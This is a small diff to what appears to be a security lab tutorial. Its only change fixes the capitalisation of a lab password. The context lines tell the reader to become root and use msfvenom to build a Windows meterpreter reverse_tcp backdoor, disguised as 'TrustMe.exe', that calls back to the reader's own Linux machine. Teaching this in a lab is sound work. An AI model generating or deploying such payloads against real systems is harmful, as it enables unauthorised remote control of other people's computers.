@@ -45,7 +45,7 @@ Please note your IP address for the Linux system on a piece of paper:
 Now, run the following commands to start a simple backdoor and backdoor listener: 
 
 $ `sudo su -`
-Please note, the CLabs password is clabs.
+Please note, the clabs password is clabs.
 
 /#`msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=<YOUR LINUX IP> lport=4444 
 -f exe -o /tmp/TrustMe.exe`
